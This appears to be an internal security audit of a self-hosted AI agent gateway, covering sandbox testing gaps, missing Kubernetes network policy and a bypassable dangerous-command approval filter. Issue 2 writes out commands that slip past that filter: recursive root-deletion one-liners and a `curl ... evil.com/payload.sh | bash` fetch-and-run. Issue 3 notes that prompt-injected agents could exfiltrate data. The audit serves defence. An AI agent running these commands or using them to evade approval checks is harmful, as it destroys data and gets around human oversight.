# Priority Issues — Security & Architecture

> Identified 2026-03-27. Each item includes evidence from the codebase and a severity assessment.

---

## 1. DockerSandboxExecutor has zero test coverage

**File:** `gateway/executors/docker.py` (273 lines)
**Tests:** None found in `tests/`

This is the **only sandbox option on Windows**. The executor has:
- A port allocation race condition (concurrent spawns could grab the same port)
- No file locking on the state persistence file (`~/.logos/docker_instances.json`)
- No integration test for the spawn → health-check → delete lifecycle
- `container_id` parsing assumes Docker stdout format (`result.stdout.strip()[:12]`)

**Risk:** Windows users get an untested sandbox path. Failures will be discovered in production.

**Severity:** HIGH — this is the primary Windows isolation path.

---

## 2. Dangerous command patterns are bypassable

**File:** `tools/approval.py:29-56`

The approval system catches common destructive shell commands (`rm -rf /`, `find / -delete`, `chmod 777`, `DROP TABLE`, etc.) but can be trivially bypassed with:

- `python3 -c "import shutil; shutil.rmtree('/')"` — interpreted language one-liner
- `perl -e 'system("rm -rf /")'`
- `curl http://evil.com/payload.sh | bash` — remote code execution
- `node -e "require('fs').rmSync('/', {recursive: true})"` — Node.js

The `python[23]?\s+-[ec]` pattern (line 49) catches the Python command but doesn't validate what code is being executed inside the string literal.

Users see "approval required for dangerous commands" and may believe they're fully protected.

**Real defense layers (working):**
- Workspace scoping (`tools/workspace.py`) — symlink-safe, well-tested
- Toolset enforcement — agents can only call enabled tools
- API key filtering — terminal subprocesses don't receive provider secrets
- Sandbox containers — filesystem isolation when Docker/k8s is used

**Risk:** The pattern matcher is one layer in a defense-in-depth stack, but it's the most visible one to users. If it's the only layer they're relying on (bare metal / local process mode), it's insufficient.

**Severity:** MEDIUM — mitigated by other layers, but misleading in local-process mode.

---

## 3. No NetworkPolicy in k8s — agent pods have unrestricted network access

**Files:** `k8s/09-rbac.yaml`, `k8s/` (no NetworkPolicy manifest)

RBAC restricts what the `logos` service account can create via the Kubernetes API, but there are zero NetworkPolicies restricting what agent pods in the `hermes` namespace can reach over the network.

A compromised or prompt-injected agent pod can:
- Scan the entire cluster internal network
- Reach other services (databases, monitoring, etc.)
- Exfiltrate data to any external endpoint
- Access the Kubernetes API server (metadata endpoint)

The README says "Kubernetes pod + RBAC boundary" but RBAC governs API access, not network access. These are orthogonal security controls.

**Risk:** The k8s deployment mode is presented as "strongest self-hosted isolation" but lacks network-level enforcement.

**Severity:** HIGH — this is the production deployment path for homelabs and teams.

---

## 4. MCP server subprocesses have no reconnection logic

**File:** `gateway/mcp_service.py:162`

If an MCP server subprocess crashes (OOM, segfault, npm error), it stays dead. `is_connected()` checks `server.session is not None` but there's no health monitoring loop or automatic restart. Recovery requires a full gateway restart.

**Status:** RESOLVED in v0.5.87 — `handle_jsonrpc()` now auto-restarts a dead server on the first request that finds it disconnected. Added `restart_server()` method to `MCPGatewayService`.

**Severity:** MEDIUM — affects MCP users only, clear error returned to agents.

---

## 5. `not-needed` API key placeholder

**File:** `gateway/run.py:234`

When no API key is configured, the code sends `api_key="not-needed"` to the OpenAI SDK, which sends `Authorization: Bearer not-needed` to the inference server.

**Status:** NOT AN ISSUE — The OpenAI Python SDK requires a non-empty `api_key` string (raises `OpenAIError` if `None` or `""`). `"not-needed"` is the standard placeholder used across the OpenAI-compatible ecosystem (Ollama docs, LM Studio defaults, llama.cpp). All tested servers ignore invalid bearer tokens when auth is disabled. Comment updated to document the reasoning.

**Severity:** LOW — correct as implemented.

---

## 6. Config.yaml changes require gateway restart (not communicated)

**File:** `gateway/run.py:64-148`

`.env` is reloaded before each chat request (`override=True`), but `config.yaml` is only bridged to `os.environ` at startup.

**Status:** ACCEPTABLE — The setup wizard and `/model` command both write to config.yaml AND set `os.environ` immediately, so changes via the UI take effect without restart. Only manual file edits require a restart. Comment added to the reload section documenting this. Priority order: `.env` (override=True) > `os.environ` (runtime /model changes) > `config.yaml` (startup bridge).

**Severity:** LOW — UX issue, not a safety issue. Only affects manual file editors.

---

## 7. No per-session spend limit or cost estimation

**File:** `agents/hermes/agent.py:265`

`max_iterations=90` is the only guard against runaway API spend. No per-user budget, no cost warning, no circuit breaker. A complex prompt on a frontier model could generate significant costs in one turn.

**Existing mitigations:**
- `max_iterations` configurable via `HERMES_MAX_ITERATIONS` env var or `agent.max_turns` in config.yaml
- `IterationBudget` shared across parent + subagents (prevents subagent sprawl)
- Budget pressure system warns the LLM at 70% and 90% of iteration limit
- Token counts are tracked and reported in per-message stats

**Remaining gap:** No dollar-amount cost estimation or per-user monthly budget. Requires model pricing data (available from OpenRouter API for cloud models, not applicable for local models). This is a feature request, not a bug.

**Severity:** MEDIUM — financial risk for cloud API users, but guarded by configurable iteration limit.
